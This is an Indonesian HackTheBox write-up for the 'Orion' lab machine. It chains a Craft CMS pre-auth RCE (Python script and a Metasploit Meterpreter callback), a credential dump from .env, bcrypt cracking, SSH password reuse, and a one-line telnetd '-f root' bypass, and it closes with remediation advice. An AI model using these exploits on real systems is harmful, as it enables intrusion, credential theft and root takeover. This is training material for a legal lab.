# HTB Orion — Dokumentasi Lengkap (Recon → Root)

> Write-up & catatan teknis lengkap untuk mesin **HackTheBox: Orion** (Linux, Easy).
> Semua perintah, skrip, dan output di dokumen ini **diverifikasi langsung** pada target.

---

## Daftar Isi

1. [Ringkasan Eksekutif](#1-ringkasan-eksekutif)
2. [Informasi Target](#2-informasi-target)
3. [Fase 1 — Reconnaissance](#3-fase-1--reconnaissance)
4. [Fase 2 — Foothold: CVE-2025-32432 (Craft CMS RCE)](#4-fase-2--foothold-cve-2025-32432-craft-cms-unauth-rce)
5. [Fase 3 — Post-Exploitation (www-data)](#5-fase-3--post-exploitation-www-data)
6. [Fase 4 — Akses User (adam)](#6-fase-4--akses-user-adam)
7. [Fase 5 — Privilege Escalation: CVE-2026-24061 (telnet)](#7-fase-5--privilege-escalation-cve-2026-24061-telnet)
8. [Flags](#8-flags)
9. [Remediation / Mitigasi](#9-remediation--mitigasi)
10. [Lampiran — Skrip Lengkap](#10-lampiran--skrip-lengkap)
11. [Referensi](#11-referensi)

---

## 1. Ringkasan Eksekutif

Target menjalankan **Craft CMS 5.6.16** yang rentan **Remote Code Execution tanpa autentikasi**.
Rantai serangan: RCE → baca kredensial DB dari `.env` → dump tabel `users` → crack hash bcrypt →
reuse password untuk SSH sebagai user `adam` → privesc ke **root** via **telnetd auth-bypass**
yang hanya listen di loopback.

| Item | Nilai |
|------|-------|
| **Target** | `10.129.132.209` (`orion.htb`) |
| **OS** | Ubuntu 22.04 (Linux 5.15) |
| **Port terbuka (eksternal)** | `22/tcp` SSH, `80/tcp` HTTP (nginx 1.18.0) |
| **Aplikasi** | Craft CMS **5.6.16** |
| **Foothold** | **CVE-2025-32432** — Craft CMS unauth RCE |
| **Kredensial DB** | `root : SuperSecureCraft123Pass!` |
| **User sistem** | `adam` |
| **Password user** | `darkangel` (hasil crack bcrypt) |
| **Privesc** | **CVE-2026-24061** — GNU inetutils telnetd 2.7 auth bypass |
| **user.txt** | `ed2855d3c588cf6289b80a3c53607917` |
| **root.txt** | `2b02894cdc250629b9f5709c1fe16b91` |

**Tingkat kesulitan rantai:** Easy — tetapi eksploit Craft CMS-nya (object injection) cukup advanced.

---

## 2. Informasi Target

| Field | Value |
|-------|-------|
| IP | `10.129.132.209` |
| Hostname / vhost | `orion.htb` |
| Web root | `/var/www/html/craft/web` |
| Craft install | `/var/www/html/craft` |
| DB | MariaDB/MySQL `127.0.0.1:3306`, database `orion` |
| Web user | `www-data` |

---

## 3. Fase 1 — Reconnaissance

### 3.1 Port Scan

Scan semua port TCP (SYN, cepat):

```bash
nmap -Pn -sS -p- --min-rate 2000 --max-retries 2 -T4 10.129.132.209 -oN nmap_all.txt
```

**Hasil:**
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Deteksi service & versi:

```bash
nmap -Pn -sV -p 22,80 --version-intensity 5 10.129.132.209
```

**Hasil:**
```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

### 3.2 Set vhost

Web hanya merespons vhost `orion.htb`:

```bash
echo "10.129.132.209 orion.htb" | sudo tee -a /etc/hosts
```

> Tanpa sudo, tetap bisa pakai header `Host:` di setiap request (lihat contoh curl di bawah).

### 3.3 Enumerasi HTTP & fingerprint

```bash
curl -sI http://10.129.132.209/
# -> 302 Moved Temporarily, Location: http://orion.htb/

curl -s -H "Host: orion.htb" -I http://10.129.132.209/
# -> 200 OK
#    Server: nginx/1.18.0 (Ubuntu)
#    X-Powered-By: Craft CMS
```

Ambil versi Craft CMS dari halaman login admin:

```bash
curl -s -H "Host: orion.htb" http://10.129.132.209/admin/login \
  | grep -oE 'Craft CMS [0-9]+\.[0-9]+\.[0-9]+'
```

**Hasil:**
```
Craft CMS 5.6.16
```

> **Temuan kunci:** Craft CMS **5.6.16** → rentan **CVE-2025-32432**.

---

## 4. Fase 2 — Foothold: CVE-2025-32432 (Craft CMS unauth RCE)

### 4.1 Analisis Kerentanan

**Endpoint:** `POST /index.php?p=admin/actions/assets/generate-transform` (tanpa autentikasi).

**Akar masalah (2 bug dirantai):**

1. **Craft CMS** meneruskan input user ke konstruktor `ImageTransform` tanpa validasi →
   bisa menyuntik properti objek arbitrer memakai sintaks Yii `as <nama>`.
2. **Yii2 (CVE-2024-58136)** mengizinkan properti `__class` **menimpa** `class`.
   Craft hanya memvalidasi `class`, tetapi Yii memakai `__class` → **arbitrary object instantiation**.

**Gadget yang dipakai:**

| Gadget | Fungsi |
|--------|--------|
| `GuzzleHttp\Psr7\FnStream` (`_fn_close`) | memanggil callable tanpa argumen → dipakai `phpinfo` untuk leak `session.save_path` |
| `yii\rbac\PhpManager` (`itemFile`) | `require` file → eksekusi PHP di dalam file session |

**Strategi RCE (session poisoning):**
1. Craft menyimpan URL tujuan (return-URL) yang belum terautentikasi **ke dalam file session PHP**.
   → kita selipkan payload `<?=eval($_GET['<param>']);die()?>` lewat query string.
2. Gadget `PhpManager` membuat Craft `require` file session tersebut → payload tereksekusi.
3. Output PHP dikembalikan **di dalam body response** → bisa kita baca langsung.

### 4.2 Eksploit Manual (Python, output langsung terbaca)

```bash
python3 exploits/cve-2025-32432_craft_rce.py -t 10.129.132.209 --vhost orion.htb \
  --php "print_r(file_get_contents('/var/www/html/craft/.env'));"
```

**Output (ringkas):**
```
[*] session: 8uvmfsqdlmvjd8pngpfc5ldiai
[*] csrf: BxaONw8yGwjskWFgj7oftWLJ...
[*] session.save_path: /var/lib/php/sessions
...
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_DATABASE=orion
```

> Kode lengkap ada di [Lampiran 10.1](#101-exploit-cve-2025-32432).

### 4.3 Alternatif: Metasploit

Modul sudah tersedia di Metasploit Framework:

```bash
msfconsole -q
```
```
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set RHOSTS 10.129.132.209
set RPORT 80
set VHOST orion.htb
set LHOST <IP_tun0_kamu>
set LPORT 4444
set TARGET 0          # 0 = PHP Meterpreter, 1 = Unix/Linux Command Shell
run
```

**Output kunci saat sukses:**
```
[+] Leaked session.save_path: /var/lib/php/sessions
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Meterpreter session 1 opened
```

---

## 5. Fase 3 — Post-Exploitation (www-data)

Setelah dapat eksekusi kode (sebagai `www-data`), langkah enumerasi.

### 5.1 Baca `.env` Craft

File: `/var/www/html/craft/.env`

```bash
cat /var/www/html/craft/.env
```

**Isi penting:**
```
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
CRAFT_ENVIRONMENT=dev
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

> **Masalah keamanan:** `CRAFT_DEV_MODE=true` + `CRAFT_ALLOW_ADMIN_CHANGES=true` + kredensial DB `root` dalam plaintext.

### 5.2 Dump tabel `users` via MySQL

Dari shell `www-data`:
```bash
mysql -h 127.0.0.1 -u root -p'SuperSecureCraft123Pass!' -D orion \
  -e "SELECT id,username,email,password FROM users;"
```

Atau lewat RCE Craft (tanpa shell interaktif) — lihat skrip `--php`:
```
--php "$p=new PDO('mysql:host=127.0.0.1;dbname=orion','root','SuperSecureCraft123Pass!');
foreach($p->query('SELECT id,username,email,password FROM users') as $r){
  echo $r['id'].' | '.$r['username'].' | '.$r['email'].' | '.$r['password'].\"\n\";}"
```

**Hasil:**
```
1 | admin | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

### 5.3 Crack hash bcrypt

Simpan hash lalu crack dengan John the Ripper (atau hashcat):

```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt

# John the Ripper
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=bcrypt --show hash.txt
```

**Hasil:**
```
darkangel        (?)
1 password hash cracked, 0 left
```

Alternatif hashcat (mode 3200 = bcrypt):
```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

> Password `darkangel` di-*reuse* oleh user sistem **`adam`** → jalur ke akses user.

---

## 6. Fase 4 — Akses User (adam)

Login SSH sebagai `adam`:

```bash
ssh adam@orion.htb          # password: darkangel
id
cat /home/adam/user.txt
```

**Hasil:**
```
uid=1000(adam) gid=1000(adam) groups=1000(adam)
ed2855d3c588cf6289b80a3c53607917
```

> Jika `sshpass` tidak tersedia, pakai skrip PTY di [Lampiran 10.2](#102-helper-ssh-dengan-password-pty).

---

## 7. Fase 5 — Privilege Escalation: CVE-2026-24061 (telnet)

### 7.1 Enumerasi service lokal

```bash
ss -lntup
```

**Hasil:**
```
tcp LISTEN  127.0.0.1:3306    # MySQL (terkait Craft CMS)
tcp LISTEN  127.0.0.1:23      # telnet  <-- LOCAL ONLY, tidak terkait Craft
tcp LISTEN  0.0.0.0:22        # SSH
tcp LISTEN  0.0.0.0:80        # nginx/Craft
```

Cek versi telnet:
```bash
telnet --version
# telnet (GNU inetutils) 2.7
```

> **Temuan kunci:** `telnetd` **GNU inetutils 2.7** di `127.0.0.1:23` → rentan **CVE-2026-24061**.

### 7.2 Analisis Kerentanan

`telnetd` meneruskan variabel `USER` (yang dikirim client via opsi **NEW-ENVIRON**, RFC 1572)
**tanpa sanitasi** ke program `login`. Jika nilai `USER = "-f root"`, maka telnetd menjalankan:

```
login -f root      # -f = "pre-authenticated", lewati password
```

→ langsung mendapat **shell root tanpa kredensial**.

**Alur protokol telnet:**

| Arah | Bytes | Arti |
|------|-------|------|
| S→C | `FF FD 27` | IAC DO NEW-ENVIRON |
| C→S | `FF FB 27` | IAC WILL NEW-ENVIRON |
| S→C | `FF FA 27 01 FF F0` | IAC SB NEW-ENVIRON SEND IAC SE |
| C→S | `FF FA 27 00 00 55 53 45 52 01 2D 66 20 72 6F 6F 74 FF F0` | IAC SB NEW-ENVIRON IS VAR "USER" VALUE "-f root" IAC SE |

### 7.3 Eksploit

**Cara termudah — pakai client telnet bawaan target (one-liner):**
```bash
USER='-f root' telnet -a 127.0.0.1
# -> root@orion:~#
```

**Otomatis (dari mesin kita, over SSH) — lihat [Lampiran 10.3](#103-exploit-cve-2026-24061):**
```bash
python3 exploits/cve-2026-24061_telnet_privesc.py \
  -t 10.129.132.209 -u adam -P darkangel --cmd "id; cat /root/root.txt"
```

**Hasil:**
```
root@orion:~# id; whoami; cat /root/root.txt; echo ===ROOTDONE===
uid=0(root) gid=0(root) groups=0(root)
2b02894cdc250629b9f5709c1fe16b91
===ROOTDONE===
root@orion:~#
```

> Jika `login` di sistem target memerlukan TTY/terminal type, PoC Python murni
> (implementasi socket NEW-ENVIRON) bisa dipakai sebagai alternatif — lihat catatan di Lampiran 10.3.

---

## 8. Flags

| Flag | Path | Nilai |
|------|------|-------|
| **user.txt** | `/home/adam/user.txt` | `ed2855d3c588cf6289b80a3c53607917` |
| **root.txt** | `/root/root.txt` | `2b02894cdc250629b9f5709c1fe16b91` |

> ⚠️ Nilai flag bersifat **unik per instance**. Flag di walkthrough publik akan berbeda.

---

## 9. Remediation / Mitigasi

### 9.1 Craft CMS — CVE-2025-32432 (unauth RCE)

| # | Tindakan | Detail |
|---|----------|--------|
| 1 | **Update Craft CMS** | Upgrade ke **≥ 5.6.17** (perbaikan CVE-2025-32432). Jalankan `php craft update`. |
| 2 | **Matikan dev mode di produksi** | `CRAFT_DEV_MODE=false`, `CRAFT_ALLOW_ADMIN_CHANGES=false`. Dev mode menampilkan detail error & mengaktifkan perilaku berisiko. |
| 3 | **Lindungi endpoint transform** | Batasi/validasi `actions/assets/generate-transform`; pasang WAF rule untuk body berisi `__class` / `as ` pada `handle`. |
| 4 | **Hardening Yii/Craft** | Pastikan dependensi Yii2 juga ter-patch (CVE-2024-58136). |
| 5 | **Pisahkan session** | Pastikan `session.save_path` tidak dapat ditulisi lintas-tenant; gunakan permission ketat. |

### 9.2 Kredensial & Rahasia

| # | Tindakan | Detail |
|---|----------|--------|
| 1 | **Rotasi semua kredensial** | Password DB, `CRAFT_SECURITY_KEY`, dan password user sistem — anggap sudah bocor. |
| 2 | **Jangan pakai `root` untuk DB aplikasi** | Buat user DB khusus dengan hak minimal (`SELECT/INSERT/UPDATE/DELETE` pada schema `orion` saja). |
| 3 | **Jangan simpan rahasia di `.env` yang bisa dibaca web** | `.env` harus di luar web root & permission `600`, owner user aplikasi. |
| 4 | **Hindari reuse password** | Password user sistem (`adam`) tidak boleh sama dengan password aplikasi/DB. |
| 5 | **bcrypt cost tinggi** | Naikkan cost bcrypt (≥ 12) agar hash lambat di-crack; paksa kebijakan password kuat. |
| 6 | **MFA** | Aktifkan 2FA untuk akun admin CMS. |

### 9.3 Telnet — CVE-2026-24061 (auth bypass)

| # | Tindakan | Detail |
|---|----------|--------|
| 1 | **Matikan telnet sepenuhnya** | `sudo systemctl disable --now telnet.socket inetd` (atau hapus `inetutils-inetd`/`telnetd`). |
| 2 | **Ganti dengan SSH** | Telnet mengirim data cleartext; SSH adalah pengganti wajib. |
| 3 | **Update GNU inetutils** | Upgrade ke **≥ 2.8** yang menyanitasi `USER` sebelum diteruskan ke `login`. |
| 4 | **Firewall / bind loopback** | Jika harus ada, bind ke `127.0.0.1` dan blokir TCP/23 di perimeter. |
| 5 | **Jangan mount `login -f`** | Nonaktifkan/whitelist flag `-f` pada `login` bila memungkinkan. |

### 9.4 Hardening Umum (Defense in Depth)

- **Least privilege** untuk service web (`www-data`) — pisahkan dari akun login manusia.
- **Monitoring & logging**: alert untuk request ke `generate-transform` dengan body mencurigakan,
  koneksi ke port 23, dan negosiasi `NEW-ENVIRON`.
- **Secret management** (Vault/KMS) daripada `.env` plaintext.
- **Patch management** rutin + pemindaian dependency (`composer audit`).
- **Network segmentation**: service internal (DB, telnet) jangan reachable dari foothold web.
- **Egress filtering** untuk mencegah reverse shell keluar.

---

## 10. Lampiran — Skrip Lengkap

Semua skrip ada di folder `exploits/`.

### 10.1 Exploit CVE-2025-32432

**File:** `exploits/cve-2025-32432_craft_rce.py`

Fitur:
- Poison session + ambil CSRF otomatis.
- Leak `session.save_path` via gadget `FnStream`/`phpinfo`.
- Jalankan PHP arbitrer via gadget `PhpManager`, output dikembalikan.

```bash
python3 exploits/cve-2025-32432_craft_rce.py -t <IP> --vhost <vhost> --php "<kode php>"
```

### 10.2 Helper SSH dengan password (PTY)

**File:** `exploits/ssh_password_login.py`

Menjalankan perintah SSH non-interaktif dengan autentikasi password (menggunakan modul `pty` stdlib),
berguna saat `sshpass` tidak tersedia.

```bash
python3 exploits/ssh_password_login.py -t <IP> -u adam -P darkangel --cmd "id; cat /home/adam/user.txt"
```

### 10.3 Exploit CVE-2026-24061

**File:** `exploits/cve-2026-24061_telnet_privesc.py`

Login SSH ke target, lalu dari dalam target menjalankan
`USER='-f root' telnet -a 127.0.0.1` dan mengeksekusi perintah sebagai root.

```bash
python3 exploits/cve-2026-24061_telnet_privesc.py \
  -t <IP> -u adam -P darkangel --cmd "id; cat /root/root.txt"
```

> **Catatan:** karena telnet hanya listen di `127.0.0.1`, eksploit harus dijalankan
> *dari dalam* target (foothold/SSH). Untuk implementasi Python murni (raw socket + NEW-ENVIRON),
> upload skrip socket ke target lalu jalankan `python3 poc.py 127.0.0.1 23`.

---

## 11. Referensi

- NVD — CVE-2025-32432 (Craft CMS RCE): https://nvd.nist.gov/vuln/detail/CVE-2025-32432
- SensePost — In-the-wild campaign CraftCMS RCE: https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/
- Exploit-DB 52525 — Craft CMS 5.6.16 RCE
- NVD — CVE-2026-24061 (GNU inetutils telnetd auth bypass): https://nvd.nist.gov/vuln/detail/CVE-2026-24061
- GNU InetUtils Security Advisory — remote auth bypass in telnetd
- HTB Orion: https://www.hackthebox.com/machines/orion

---

*Dokumen ini dibuat untuk keperluan pembelajaran/pelatihan pada lingkungan lab yang sah (HTB).*
